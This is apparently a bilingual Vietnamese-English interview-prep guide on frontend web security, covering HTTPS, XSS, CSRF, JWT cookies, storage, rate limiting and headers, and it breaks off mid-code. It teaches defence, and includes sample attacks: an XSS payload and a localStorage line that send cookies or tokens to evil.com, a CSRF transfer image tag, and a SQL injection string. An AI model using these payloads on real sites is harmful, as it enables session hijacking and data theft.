# 🔒 Q39: Bảo Mật Security trên Web Application Frontend

## **⭐ PHIÊN BẢN TRẢ LỜI 1 PHÚT (Cho Phỏng Vấn Nhanh)**

**"Web security là chiến lược 7 tầng bảo vệ (Defense in Depth - Phòng thủ đa tầng): HTTPS mã hóa transport (mã hóa vận chuyển), XSS sanitize input/output (làm sạch đầu vào/đầu ra), CSRF dùng token validation (xác thực token), Authentication với JWT + HttpOnly cookies (Xác thực với JWT + cookie HttpOnly), Secure Storage tránh localStorage cho sensitive data (Lưu trữ an toàn - tránh localStorage cho dữ liệu nhạy cảm), API security với rate limiting + CORS (Bảo mật API với giới hạn tốc độ + CORS), và Security Headers (CSP, HSTS) chống các attack vectors (Tiêu đề bảo mật chống các vector tấn công).**

**Đã implement security cho trading platform xử lý 10K concurrent users (đã triển khai bảo mật cho nền tảng giao dịch xử lý 10K người dùng đồng thời): kết hợp DOMPurify sanitize XSS (kết hợp DOMPurify làm sạch XSS), CSRF token cho mọi mutation (token CSRF cho mọi thay đổi), JWT access token 15 phút + refresh token 7 ngày trong HttpOnly cookie (JWT access token 15 phút + refresh token 7 ngày trong cookie HttpOnly), CSP headers block inline scripts (tiêu đề CSP chặn script nội tuyến), rate limiting 100 req/min (giới hạn tốc độ 100 yêu cầu/phút), và dependency scanning với Snyk (và quét phụ thuộc với Snyk). Kết quả: 0 security incidents trong 2 năm production (0 sự cố bảo mật trong 2 năm sản xuất).**

**Key principles (Nguyên tắc chính): Never trust client (Không bao giờ tin tưởng client), validate server-side (xác thực phía máy chủ), encrypt sensitive data (mã hóa dữ liệu nhạy cảm), principle of least privilege (nguyên tắc đặc quyền tối thiểu), và regular security audits (và kiểm toán bảo mật thường xuyên). Critical (Quan trọng): HttpOnly cookies cho tokens (không localStorage) (cookie HttpOnly cho token - không localStorage), sanitize user input (làm sạch đầu vào người dùng), và CSP headers (và tiêu đề CSP)."**

---

## **📋 2. GIẢI THÍCH CHI TIẾT CẤP SENIOR/STAFF**

### **🎯 Khái Niệm Core: Defense in Depth (Phòng Thủ Đa Tầng)**

**Web security không phải 1 giải pháp duy nhất - đó là hệ thống bảo vệ nhiều tầng. Nếu 1 tầng bị xuyên thủng, các tầng khác vẫn bảo vệ.**

**"Web security = 7 layers (Bảo mật web = 7 tầng): HTTPS, XSS, CSRF, Auth (Xác thực), Storage (Lưu trữ), API, Headers (Tiêu đề). Defense in depth (Phòng thủ đa tầng).**

**🛡️ 7-Layer Security Strategy (Chiến Lược Bảo Mật 7 Tầng):**

1. **HTTPS + TLS**:

   - Mã hóa data giữa browser ↔ server (Encrypt data between browser ↔ server) → ngăn Man-in-the-Middle (prevent Man-in-the-Middle attack).
   - **HSTS**: `Strict-Transport-Security` header → bắt buộc HTTPS (force HTTPS).

2. **XSS Prevention (Cross-Site Scripting - Ngăn Chặn XSS)**:

   - **Problem (Vấn đề)**: Attacker inject malicious `<script>` (Kẻ tấn công chèn script độc hại) → steal cookies, session (đánh cắp cookie, phiên).
   - **Solution (Giải pháp)**:
     - **React auto-escape**: `{userInput}` auto sanitize (tự động làm sạch).
     - **DOMPurify**: Sanitize HTML khi cần `dangerouslySetInnerHTML` (Làm sạch HTML khi cần).
     - **CSP**: `Content-Security-Policy` header → block inline scripts (chặn script nội tuyến).

   ```js
   // ❌ Vulnerable (Dễ bị tấn công)
   <div dangerouslySetInnerHTML={{ __html: userInput }} />;
   // ✅ Safe (An toàn)
   import DOMPurify from 'dompurify';
   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />;
   ```

3. **CSRF Protection (Cross-Site Request Forgery - Bảo Vệ CSRF)**:

   - **Problem (Vấn đề)**: Attacker trick user send malicious request (Kẻ tấn công lừa người dùng gửi yêu cầu độc hại) (e.g., transfer money - ví dụ: chuyển tiền).
   - **Solution (Giải pháp)**:
     - **CSRF Token**: Server generate unique token per session (Máy chủ tạo token duy nhất mỗi phiên) → include in forms (bao gồm trong form).
     - **SameSite Cookies**: `SameSite=Strict` → cookies chỉ send same-origin requests (cookie chỉ gửi yêu cầu cùng nguồn).

4. **Authentication & Authorization (Xác Thực & Phân Quyền)**:

   - **JWT**: Access token (short-lived, 15 min - ngắn hạn, 15 phút) + Refresh token (long-lived, 7 days - dài hạn, 7 ngày).
   - **HttpOnly Cookies**: Store tokens → JavaScript không access được (Lưu token → JavaScript không thể truy cập) (prevent XSS steal - ngăn đánh cắp XSS).
   - **Token Refresh**: Auto refresh access token khi expired (Tự động làm mới token khi hết hạn) (seamless UX - trải nghiệm người dùng liền mạch).

5. **Secure Storage (Lưu Trữ An Toàn)**:

   - **NEVER localStorage for sensitive data (KHÔNG BAO GIỜ localStorage cho dữ liệu nhạy cảm)**: JavaScript có thể access (JavaScript can access) → XSS risk (rủi ro XSS).
   - **HttpOnly Cookies**: Best cho tokens (Tốt nhất cho token) (server-only access - chỉ máy chủ truy cập).
   - **Encrypt sensitive data (Mã hóa dữ liệu nhạy cảm)**: AES-256 encryption trước khi store (mã hóa AES-256 trước khi lưu).

6. **API Security (Bảo Mật API)**:

   - **Rate Limiting (Giới hạn tốc độ)**: Limit requests (100/min) (Giới hạn yêu cầu - 100/phút) → prevent brute-force (ngăn tấn công vũ phu).
   - **Input Validation (Xác thực đầu vào)**: Validate/sanitize inputs server-side (Xác thực/làm sạch đầu vào phía máy chủ) (không tin client - don't trust client).
   - **CORS**: Restrict origins có thể call API (Giới hạn nguồn gốc có thể gọi API).

   ```js
   // Server (Express)
   app.use(cors({ origin: 'https://trusted-domain.com' }));
   // (Chỉ cho phép domain tin cậy gọi API)
   ```

7. **Security Headers (Tiêu Đề Bảo Mật)**:
   - **CSP**: `Content-Security-Policy: default-src 'self'` → block external scripts (chặn script bên ngoài).
   - **X-Frame-Options**: `DENY` → prevent clickjacking (ngăn clickjacking).
   - **X-Content-Type-Options**: `nosniff` → prevent MIME sniffing (ngăn ngửi MIME).
   - **Referrer-Policy**: Control referrer info leaked (Kiểm soát thông tin referrer bị rò rỉ).

**⚠️ Common Vulnerabilities (OWASP Top 10 - Lỗ Hổng Thường Gặp):**

1. **Injection (Chèn mã)** (SQL, XSS): Sanitize inputs (Làm sạch đầu vào), use parameterized queries (sử dụng truy vấn tham số hóa).
2. **Broken Authentication (Xác thực bị hỏng)**: Strong passwords (Mật khẩu mạnh), MFA (Xác thực đa yếu tố), session timeout (hết hạn phiên).
3. **Sensitive Data Exposure (Lộ dữ liệu nhạy cảm)**: Encrypt data (Mã hóa dữ liệu), HTTPS, HttpOnly cookies.
4. **XML External Entities (XXE - Thực thể bên ngoài XML)**: Disable XML external entity processing (Tắt xử lý thực thể bên ngoài XML).
5. **Broken Access Control (Kiểm soát truy cập bị hỏng)**: Server-side authorization checks (Kiểm tra phân quyền phía máy chủ).
6. **Security Misconfiguration (Cấu hình bảo mật sai)**: Remove default credentials (Xóa thông tin đăng nhập mặc định), disable debug mode (tắt chế độ debug).
7. **XSS**: Escape outputs (Thoát đầu ra), CSP headers (tiêu đề CSP).
8. **Insecure Deserialization (Giải tuần tự hóa không an toàn)**: Validate serialized data (Xác thực dữ liệu đã tuần tự hóa).
9. **Using Components with Known Vulnerabilities (Sử dụng thành phần có lỗ hổng đã biết)**: Regular dependency updates (Cập nhật phụ thuộc thường xuyên) (`npm audit`).
10. **Insufficient Logging & Monitoring (Ghi nhật ký & Giám sát không đủ)**: Log security events (Ghi nhật ký sự kiện bảo mật), monitor anomalies (giám sát bất thường).

**💡 Senior Insights (Kiến Thức Senior):**

- **Defense in Depth (Phòng thủ đa tầng)**: Multiple layers (Nhiều tầng) → nếu 1 layer fail (nếu 1 tầng thất bại), others protect (các tầng khác vẫn bảo vệ).
- **Security Audits (Kiểm toán bảo mật)**: Regular penetration testing (Kiểm thử xâm nhập thường xuyên), code reviews (đánh giá mã).
- **Dependency Scanning (Quét phụ thuộc)**: `npm audit`, Snyk, Dependabot → auto update vulnerable packages (tự động cập nhật gói có lỗ hổng).
- **Security Headers (Tiêu đề bảo mật)**: Use helmet.js (Node.js) → auto set secure headers (tự động đặt tiêu đề bảo mật).
- **HTTPS Everywhere (HTTPS mọi nơi)**: Even internal apps (Ngay cả ứng dụng nội bộ) → prevent internal network sniffing (ngăn ngửi mạng nội bộ).

**🚀 Best Practices (Thực Hành Tốt Nhất):**

- Principle of Least Privilege (Nguyên tắc đặc quyền tối thiểu): Users chỉ access data cần thiết (Người dùng chỉ truy cập dữ liệu cần thiết).
- Never trust client-side validation (Không bao giờ tin xác thực phía client): Always validate server-side (Luôn xác thực phía máy chủ).
- Encrypt sensitive data at rest & in transit (Mã hóa dữ liệu nhạy cảm khi nghỉ & khi truyền).
- Regular security training cho developers (Đào tạo bảo mật thường xuyên cho nhà phát triển).

### **🔬 Chi Tiết 7 Tầng Bảo Mật**

#### **Tầng 1: HTTPS + TLS (Transport Layer Security - Bảo Mật Tầng Truyền Tải)**

**Vai trò:** 🔐 Mã hóa dữ liệu khi truyền giữa browser ↔ server
// 💡 HTTPS = HTTP + TLS/SSL encryption
// 💡 Tất cả data được mã hóa → Hacker không đọc được ngay cả khi intercept

**Tại sao quan trọng:**

- 🛡️ **Ngăn Man-in-the-Middle (MITM) attack** - hacker không đọc/sửa được data
  // 💡 MITM: Hacker đứng giữa browser và server, intercept data
  // 💡 HTTPS: Data mã hóa → Hacker chỉ thấy ký tự lộn xộn, không hiểu được
- ✅ **Xác thực server (certificate)** - đảm bảo user đang kết nối đến server đúng
  // 💡 Certificate: Chứng chỉ chứng minh server là thật (không phải fake)
  // 💡 Browser verify certificate → Nếu fake → Cảnh báo user
- 📈 **SEO benefit** - Google ưu tiên HTTPS trong ranking
  // 💡 Google xem HTTPS là ranking factor → Website HTTPS rank cao hơn

**Cách hoạt động:**

```
1. 🌐 Browser request HTTPS connection
   // 💡 User truy cập https://example.com → Browser bắt đầu handshake

2. 📜 Server gửi SSL/TLS certificate (chứng chỉ bảo mật)
   // 💡 Certificate chứa: Domain name, Public key, CA signature
   // 💡 Chứng minh server là thật, không phải hacker giả mạo

3. ✅ Browser verify certificate với Certificate Authority (CA)
   // 💡 CA: Tổ chức tin cậy (Let's Encrypt, DigiCert...) đã ký certificate
   // 💡 Browser check: Certificate có được CA ký không? Domain có đúng không?

4. 🔑 Tạo encrypted session với symmetric key
   // 💡 Symmetric key: Key dùng để mã hóa/giải mã data
   // 💡 Key được tạo ngẫu nhiên, chỉ browser và server biết

5. 🔒 Mọi data sau đó được mã hóa với session key
   // 💡 Request/Response đều được mã hóa → An toàn tuyệt đối
```

**Best practices (Thực hành tốt nhất):**

- ✅ **Dùng TLS 1.2 trở lên (Use TLS 1.2+)** (không TLS 1.0/1.1 - đã lỗi thời - not TLS 1.0/1.1 - outdated)
  // 💡 TLS 1.0/1.1: Có lỗ hổng bảo mật → Không dùng nữa (Has security vulnerabilities → No longer used)
  // 💡 TLS 1.2/1.3: Phiên bản mới, an toàn hơn (New versions, more secure)
- 🚀 **Enable HSTS header (Bật tiêu đề HSTS)** → browser tự động chuyển HTTP → HTTPS (browser automatically converts HTTP → HTTPS)
  // 💡 HSTS: Strict-Transport-Security header
  // 💡 Browser nhớ: Site này chỉ dùng HTTPS → Tự động redirect HTTP → HTTPS
  // (Browser remembers: This site only uses HTTPS → Auto redirect HTTP → HTTPS)
- 📜 **Certificate từ CA tin cậy (Certificate from trusted CA)** (Let's Encrypt free, Cloudflare, DigiCert)
  // 💡 CA: Certificate Authority - Tổ chức cấp chứng chỉ (Certificate Authority - Organization that issues certificates)
  // 💡 Let's Encrypt: Miễn phí, tự động renew (Free, auto renew)
- ⏰ **Renew certificate trước khi hết hạn (Renew certificate before expiration)** (auto-renewal với certbot - auto-renewal with certbot)
  // 💡 Certificate có thời hạn (thường 90 ngày) (Certificate has expiration - usually 90 days)
  // 💡 Certbot: Tool tự động renew certificate → Không bao giờ hết hạn (Tool auto renews certificate → Never expires)

---

#### **Tầng 2: XSS Prevention (Cross-Site Scripting - Ngăn Chặn Tấn Công XSS)**

**Vai trò:** 🛡️ Ngăn hacker inject malicious JavaScript code
// 💡 XSS: Hacker chèn script độc vào website → Script chạy → Steal data, hijack session
// 💡 Mục tiêu: Đánh cắp cookies, session tokens, thông tin nhạy cảm

**Attack scenario (Kịch bản tấn công):**

```javascript
// 🚨 Hacker post comment độc hại (Hacker posts malicious comment):
<img src="x" onerror="
  fetch('https://evil.com/steal?cookie=' + document.cookie)
">
// 💡 Hacker nhập HTML độc vào form comment (Hacker enters malicious HTML into comment form)
// 💡 <img> tag với src="x" (không tồn tại) → Image load fail (<img> tag with src="x" - doesn't exist → Image load fails)
// 💡 onerror: Event handler chạy khi image load fail (Event handler runs when image load fails)
// 💡 document.cookie: Lấy tất cả cookies (bao gồm session token) (Gets all cookies - including session token)

// ⚠️ Khi user khác xem comment (When other user views comment):
// 1. Browser render HTML → Image load fail (Browser renders HTML → Image load fails)
// 2. onerror trigger → Script chạy (onerror triggers → Script runs)
// 3. fetch() gửi cookies về server hacker (evil.com) (fetch() sends cookies to hacker's server)
// 4. Hacker nhận cookies → Dùng để hijack session (Hacker receives cookies → Uses to hijack session)
// 5. Hacker đăng nhập với session của victim → Steal data, chuyển tiền... (Hacker logs in with victim's session → Steal data, transfer money...)
```

**3 loại XSS (3 Types of XSS):**

1. **📦 Stored XSS (XSS lưu trữ)**: Lưu script trong database → hiển thị cho mọi user (Store script in database → display to all users)
   // 💡 Script được lưu vĩnh viễn trong DB (Script stored permanently in DB)
   // 💡 Mọi user xem đều bị tấn công (All users viewing are attacked)
   // 💡 VD (Example): Comment, post, profile name...

2. **🔗 Reflected XSS (XSS phản chiếu)**: Script trong URL → victim click link độc (Script in URL → victim clicks malicious link)
   // 💡 Script không lưu trong DB, chỉ trong URL (Script not stored in DB, only in URL)
   // 💡 Hacker gửi link độc → User click → Script chạy (Hacker sends malicious link → User clicks → Script runs)
   // 💡 VD (Example): `https://site.com/search?q=<script>alert('xss')</script>`

3. **🌐 DOM-based XSS (XSS dựa trên DOM)**: Client-side JavaScript xử lý input không an toàn (Client-side JavaScript processes unsafe input)
   // 💡 Script không đến server, chỉ xử lý ở client (Script doesn't reach server, only processed on client)
   // 💡 VD (Example): `document.location.hash` → Render HTML không sanitize (Render HTML without sanitization)

**Defense strategies (Chiến lược phòng thủ):**

- ✅ **Input sanitization (Làm sạch đầu vào)**: Loại bỏ/escape dangerous characters (Remove/escape dangerous characters)
  // 💡 Sanitize: Làm sạch input, xóa các ký tự nguy hiểm (Clean input, remove dangerous characters)
  // 💡 VD (Example): `<script>` → `&lt;script&gt;` hoặc xóa hẳn (or remove completely)
  // 💡 Tool: DOMPurify, sanitize-html

- ✅ **Output encoding (Mã hóa đầu ra)**: Convert `<` → `&lt;`, `>` → `&gt;`
  // 💡 Encode: Chuyển đổi ký tự đặc biệt thành HTML entities (Convert special characters to HTML entities)
  // 💡 `<script>` → `&lt;script&gt;` → Browser hiển thị text, không chạy code (Browser displays text, doesn't run code)
  // 💡 React tự động làm việc này với `{userInput}` (React automatically does this with `{userInput}`)

- ✅ **CSP (Content Security Policy - Chính sách bảo mật nội dung)**: Whitelist nguồn script được phép (Whitelist allowed script sources)
  // 💡 CSP: Header chỉ định script nào được phép chạy (Header specifies which scripts are allowed to run)
  // 💡 VD (Example): `script-src 'self'` → Chỉ script từ cùng domain (Only scripts from same domain)
  // 💡 Script từ evil.com → Browser BLOCK → XSS thất bại (Script from evil.com → Browser BLOCKS → XSS fails)

- ✅ **React auto-escape (React tự động escape)**: `{userInput}` tự động escape
  // 💡 React tự động escape HTML trong JSX (React automatically escapes HTML in JSX)
  // 💡 `<script>` → Hiển thị text, không chạy code (Displays text, doesn't run code)
  // 💡 ⚠️ Lưu ý (Note): `dangerouslySetInnerHTML` KHÔNG escape → Phải sanitize! (doesn't escape → Must sanitize!)

- ✅ **HttpOnly cookies (Cookie HttpOnly)**: JavaScript không access được cookie (JavaScript cannot access cookie)
  // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được (Cookie only sent with HTTP requests, JS can't read)
  // 💡 XSS steal cookie → Không được → Giảm thiệt hại (XSS steal cookie → Can't → Reduces damage)
  // 💡 VD (Example): `Set-Cookie: session=abc123; HttpOnly`

---

#### **Tầng 3: CSRF Protection (Cross-Site Request Forgery - Ngăn Chặn Tấn Công CSRF)**

**Vai trò:** 🛡️ Ngăn attacker lừa user gửi request không mong muốn
// 💡 CSRF: Hacker lừa user (đã login) gửi request độc → Thực hiện action không mong muốn
// 💡 VD: Chuyển tiền, đổi password, xóa account...

**Attack scenario (Kịch bản tấn công):**

```html
<!-- 📧 Email phishing gửi đến victim (đã login vào bank.com) -->
<!-- (Phishing email sent to victim - already logged into bank.com) -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
// 💡 Hacker gửi email chứa HTML độc (Hacker sends email containing malicious
HTML) // 💡 <img /> tag với src là URL chuyển tiền (<img /> tag with src as
transfer URL) // 💡 User mở email → Browser tự động load image → Gửi GET request
(User opens email → Browser auto loads image → Sends GET request)

<!-- ⚠️ Browser tự động gửi request kèm cookies của bank.com -->
<!-- (Browser automatically sends request with bank.com cookies) -->
<!-- → Server nhận request + cookies (session token) (Server receives request + cookies - session token) -->
<!-- → Server nghĩ đây là request hợp lệ từ user đã login (Server thinks this is valid request from logged-in user) -->
<!-- → Xử lý request → Chuyển $10,000 cho hacker (Processes request → Transfers $10,000 to hacker) -->
<!-- → User không biết gì cho đến khi check tài khoản! (User doesn't know until checking account!) -->
```

**Defense strategies (Chiến lược phòng thủ):**

1. **🔑 CSRF Token (Token CSRF)**: Server tạo unique token mỗi session (Server creates unique token per session)
   // 💡 Token: Chuỗi ngẫu nhiên, khó đoán (32 bytes) (Random string, hard to guess - 32 bytes)
   // 💡 Mỗi session có token riêng → Hacker không biết token của user khác (Each session has own token → Hacker doesn't know other user's token)

   - ✅ **Frontend gửi token trong request body/header (Frontend sends token in request body/header)**
     // 💡 Form: `<input type="hidden" name="csrfToken" value="...">`
     // 💡 AJAX: Header `X-CSRF-Token: ...`

   - ✅ **Server verify token trước khi xử lý (Server verifies token before processing)**
     // 💡 So sánh token từ client vs token trong session (Compare token from client vs token in session)
     // 💡 Không khớp → Reject request → CSRF thất bại (Don't match → Reject request → CSRF fails)
     // 💡 Khớp → Xử lý request bình thường (Match → Process request normally)

2. **🍪 SameSite Cookie**: `SameSite=Strict` hoặc `Lax`
   // 💡 SameSite: Browser chỉ gửi cookie cho same-origin requests (Browser only sends cookie for same-origin requests)
   // 💡 Strict: Cookie KHÔNG BAO GIỜ gửi cho cross-site requests (Cookie NEVER sent for cross-site requests)
   // 💡 Lax: Cookie gửi cho GET requests từ cross-site (nhưng không POST) (Cookie sent for GET requests from cross-site - but not POST)

   - ✅ **Browser không gửi cookie cho cross-site requests (Browser doesn't send cookie for cross-site requests)**
     // 💡 Request từ evil.com → Browser KHÔNG gửi cookie của bank.com (Request from evil.com → Browser DOESN'T send bank.com cookie)
     // 💡 Server không nhận cookie → Không có session → Reject request (Server doesn't receive cookie → No session → Reject request)
     // 💡 CSRF thất bại! (CSRF fails!)

3. **🔐 Double Submit Cookie (Cookie gửi kép)**:
   // 💡 Cookie chứa random token (CSRF token) (Cookie contains random token - CSRF token)
   // 💡 Form/AJAX cũng gửi token (trong body hoặc header) (Form/AJAX also sends token - in body or header)
   // 💡 Server compare 2 values → Phải khớp mới xử lý (Server compares 2 values → Must match to process)

   - ✅ **Cookie chứa random token**
     // 💡 Server set cookie: `csrf-token=abc123`
     // 💡 Cookie tự động gửi với mọi request

   - ✅ **Form/AJAX cũng gửi token**
     // 💡 Form: `<input name="csrfToken" value="abc123">`
     // 💡 AJAX: Header `X-CSRF-Token: abc123`

   - ✅ **Server compare 2 values**
     // 💡 Cookie token vs Form token → Phải giống nhau
     // 💡 Hacker không đọc được cookie (Same-Origin Policy) → Không biết token
     // 💡 Request thiếu token hoặc token sai → Reject → CSRF thất bại

---

#### **Tầng 4: Authentication & Authorization (Xác Thực & Phân Quyền)**

**Vai trò:** 🔐 Xác minh identity (ai đang request) và permissions (được làm gì)
// 💡 Authentication: Xác minh user là ai (login, verify identity)
// 💡 Authorization: Xác minh user được làm gì (permissions, roles)

**JWT-based auth architecture (Kiến trúc xác thực dựa trên JWT):**

```
┌─────────────────────────────────────────────────────┐
│  🔐 Login Flow (Authentication - Quy trình đăng nhập) │
├─────────────────────────────────────────────────────┤
│  1. 👤 User gửi username + password                     │
│     // 💡 User nhập thông tin đăng nhập vào form
│     // 💡 Password được hash (bcrypt) trước khi gửi
│
│  2. ✅ Server verify credentials                        │
│     // 💡 Server check: Username có tồn tại không?
│     // 💡 Server check: Password có đúng không? (so sánh hash)
│     // 💡 Nếu đúng → Tiếp tục, nếu sai → Reject
│
│  3. 🎫 Server tạo:                                      │
│     • Access Token (JWT, 15 min) - cho API calls    │
│       // 💡 Access Token: Token ngắn hạn (15 phút)
│       // 💡 Dùng để gọi API, gửi trong header: Authorization: Bearer <token>
│       // 💡 Ngắn hạn → Nếu bị steal, hacker chỉ dùng được 15 phút
│     • Refresh Token (7 days) - renew access token   │
│       // 💡 Refresh Token: Token dài hạn (7 ngày)
│       // 💡 Dùng để lấy access token mới khi access token hết hạn
│       // 💡 Không dùng để gọi API trực tiếp
│
│  4. 🍪 Store trong HttpOnly cookies                    │
│     // 💡 HttpOnly: JavaScript KHÔNG đọc được → XSS không steal được
│     // 💡 Secure: Chỉ gửi qua HTTPS → An toàn
│     // 💡 SameSite: Strict → Chống CSRF
└─────────────────────────────────────────────────────┘
```

**Token security best practices (Thực hành tốt nhất cho token):**

- ✅ **Short-lived access token**: 15 phút → giảm thiệt hại nếu bị steal
  // 💡 Token ngắn hạn: Nếu hacker steal được → Chỉ dùng được 15 phút
  // 💡 Token dài hạn: Nếu bị steal → Hacker dùng được lâu → Thiệt hại lớn
  // 💡 Trade-off: Ngắn hạn → User phải refresh thường xuyên (UX hơi khó chịu)

- ✅ **HttpOnly + Secure cookies**: JavaScript không access, chỉ gửi qua HTTPS
  // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được
  // 💡 Secure: Cookie chỉ gửi qua HTTPS (không HTTP)
  // 💡 Kết hợp → XSS không steal được token

- ✅ **Refresh token rotation**: Mỗi lần refresh → tạo refresh token mới
  // 💡 Rotation: Tạo refresh token mới, vô hiệu hóa token cũ
  // 💡 Lợi ích: Nếu hacker steal refresh token → Chỉ dùng được 1 lần
  // 💡 Token cũ bị vô hiệu hóa → Hacker không dùng được nữa

- ✅ **Blacklist/Whitelist**: Track revoked tokens (logout, suspicious activity)
  // 💡 Blacklist: Danh sách token đã bị vô hiệu hóa (logout, suspicious...)
  // 💡 Server check blacklist trước khi verify token
  // 💡 Token trong blacklist → Reject → Không cho access

**Authorization patterns (Mẫu phân quyền):**

- 🎭 **RBAC (Role-Based Access Control)**: Admin, Editor, Viewer
  // 💡 Phân quyền dựa trên role (vai trò)
  // 💡 VD: Admin → Full access, Editor → Chỉ edit, Viewer → Chỉ xem
  // 💡 Đơn giản, dễ implement, phù hợp hầu hết use cases

- 🔐 **ABAC (Attribute-Based Access Control)**: Dynamic permissions dựa trên context
  // 💡 Phân quyền dựa trên attributes (thuộc tính)
  // 💡 VD: User chỉ edit được post của chính mình, không edit được của người khác
  // 💡 Linh hoạt hơn RBAC, phù hợp use cases phức tạp

- ⚖️ **Least Privilege**: Chỉ grant permissions tối thiểu cần thiết
  // 💡 Nguyên tắc: User chỉ được quyền tối thiểu cần thiết
  // 💡 VD: User không cần delete → Không cho quyền delete
  // 💡 Giảm thiệt hại nếu account bị compromise

---

#### **Tầng 5: Secure Storage (Lưu Trữ An Toàn)**

**Vai trò:** 🔒 Bảo vệ sensitive data ở client-side
// 💡 Client-side: Dữ liệu lưu ở browser (localStorage, cookies, memory...)
// 💡 Vấn đề: JavaScript có thể đọc được → XSS attack có thể steal

**❌ KHÔNG BAO GIỜ lưu trong localStorage/sessionStorage:**

- 🚫 **Access tokens**
  // 💡 Token: Dùng để authenticate → Nếu bị steal → Hacker đăng nhập được
  // 💡 localStorage: JS đọc được → XSS steal được → Nguy hiểm!

- 🚫 **Passwords**
  // 💡 Password: Thông tin cực kỳ nhạy cảm
  // 💡 KHÔNG BAO GIỜ lưu password ở client-side (kể cả đã hash)
  // 💡 Chỉ server mới được lưu password (đã hash với bcrypt)

- 🚫 **Credit card numbers**
  // 💡 Credit card: Thông tin tài chính nhạy cảm
  // 💡 PCI DSS: Không được lưu credit card ở client-side
  // 💡 Dùng payment gateway (Stripe, PayPal...) → Họ xử lý

- 🚫 **Personal Identifiable Information (PII)**
  // 💡 PII: Thông tin cá nhân (SSN, passport, ID number...)
  // 💡 GDPR: Bảo vệ PII nghiêm ngặt → Không lưu ở client-side

**Lý do:** ⚠️ JavaScript bất kỳ (kể cả từ XSS) đều access được
// 💡 localStorage/sessionStorage: Bất kỳ script nào cũng đọc được
// 💡 XSS attack: Inject script → Script đọc localStorage → Steal data
// 💡 VD: `const token = localStorage.getItem('token'); fetch('evil.com?token=' + token);`

**✅ Secure storage options (Các lựa chọn lưu trữ an toàn):**

| Storage Type           | Use Case    | Security                                  |
| ---------------------- | ----------- | ----------------------------------------- |
| **🍪 HttpOnly Cookie** | Auth tokens | ✅ JS không access, auto gửi với requests |

| // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được
| // 💡 Secure: Chỉ gửi qua HTTPS → An toàn
| // 💡 Best choice cho auth tokens
| **💾 IndexedDB (encrypted)** | Large cached data | ⚠️ Phải encrypt trước, JS access được |
| // 💡 IndexedDB: Database ở browser, lưu được nhiều data
| // 💡 ⚠️ JS vẫn đọc được → PHẢI encrypt trước khi lưu
| // 💡 Dùng cho: Cache data lớn (đã encrypt)
| **📋 SessionStorage** | Temporary UI state | ⚠️ Clear khi đóng tab, không dùng cho sensitive |
| // 💡 SessionStorage: Lưu data trong session (tab)
| // 💡 Clear khi đóng tab → An toàn hơn localStorage
| // 💡 ⚠️ Vẫn bị XSS steal → Không dùng cho sensitive data
| **🧠 Memory (React state)** | Runtime data | ✅ Clear khi reload, không persist |
| // 💡 Memory: Lưu trong RAM, không persist
| // 💡 Reload page → Data mất → An toàn nhất
| // 💡 Dùng cho: Access token (tạm thời), UI state

**Encryption best practices (Thực hành mã hóa tốt nhất):**

```typescript
// ❌ Lưu plaintext (văn bản gốc - CỰC KỲ NGUY HIỂM!)
localStorage.setItem('creditCard', '1234-5678-9012-3456');
// 💡 ⚠️ NGUY HIỂM: Bất kỳ script nào cũng đọc được
// 💡 XSS attack → Steal credit card → Ngay lập tức!

// ✅ Encrypt trước khi lưu (nếu thực sự cần)
import CryptoJS from 'crypto-js';
const encrypted = CryptoJS.AES.encrypt(
  sensitiveData, // 📦 Data cần mã hóa
  process.env.ENCRYPTION_KEY // 🔑 Key mã hóa (giữ bí mật!)
).toString();
localStorage.setItem('data', encrypted);
// 💡 AES-256: Thuật toán mã hóa mạnh
// 💡 Encrypted: Data đã mã hóa → Script đọc được nhưng không hiểu
// 💡 ⚠️ Lưu ý: Key phải giữ bí mật → Không commit vào git
// 💡 ⚠️ Best practice: Vẫn nên tránh lưu sensitive data ở client-side
```

---

#### **Tầng 6: API Security (Bảo Mật API)**

**Vai trò:** 🛡️ Bảo vệ backend APIs khỏi abuse và attacks
// 💡 API: Backend endpoints xử lý requests từ frontend
// 💡 Threats: Brute-force, DDoS, SQL injection, unauthorized access...

**Key security measures (Các biện pháp bảo mật chính):**

**A. Rate Limiting (Giới hạn số requests)**

```typescript
// Backend: Express middleware
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 60 * 1000, // ⏱️ 1 phút = 60,000 milliseconds
  // 💡 Window: Khoảng thời gian đếm requests
  max: 100, // 📊 Max 100 requests/phút
  // 💡 Max: Số requests tối đa trong window
  message: 'Too many requests from this IP', // 📝 Message khi vượt limit
  standardHeaders: true, // 📋 Gửi rate limit info trong headers
  legacyHeaders: false, // 🚫 Không dùng headers cũ
});

app.use('/api/', limiter); // 🔒 Áp dụng cho tất cả API routes
// 💡 Mọi request đến /api/ đều bị rate limit
// 💡 Vượt 100 requests/phút → Trả về 429 Too Many Requests
```

**Purpose (Mục đích):**

- 🛡️ **Ngăn brute-force attacks** (đoán password)
  // 💡 Brute-force: Thử nhiều password → Rate limit ngăn thử quá nhiều
  // 💡 VD: Hacker thử 1000 passwords/phút → Rate limit block → Thất bại

- 🛡️ **DDoS protection**
  // 💡 DDoS: Gửi nhiều requests → Server quá tải → Crash
  // 💡 Rate limit: Giới hạn requests → Server không bị quá tải

- 🛡️ **Abuse prevention** (scraping, spam)
  // 💡 Scraping: Bot crawl data → Rate limit ngăn crawl quá nhanh
  // 💡 Spam: Gửi nhiều requests → Rate limit ngăn spam

**B. Input Validation & Sanitization (Kiểm tra & Làm sạch Input)**

```typescript
// ❌ Không validate (CỰC KỲ NGUY HIỂM!)
app.post('/api/user', (req, res) => {
  db.query(`SELECT * FROM users WHERE id = ${req.body.id}`);
  // 🚨 SQL Injection risk!
  // 💡 Hacker gửi: { id: "1 OR 1=1" }
  // 💡 Query: SELECT * FROM users WHERE id = 1 OR 1=1
  // 💡 Kết quả: Lấy TẤT CẢ users → Data leak!
});

// ✅ Validate + Parameterized query (AN TOÀN)
import { z } from 'zod'; // 📦 Zod: Library validate TypeScript

const userSchema = z.object({
  id: z.number().positive(), // ✅ Phải là số dương
  email: z.string().email(), // ✅ Phải là email hợp lệ
  age: z.number().min(18).max(120), // ✅ Tuổi từ 18-120
});
// 💡 Schema: Định nghĩa format data hợp lệ

app.post('/api/user', async (req, res) => {
  const validated = userSchema.parse(req.body); // ✅ Validate data
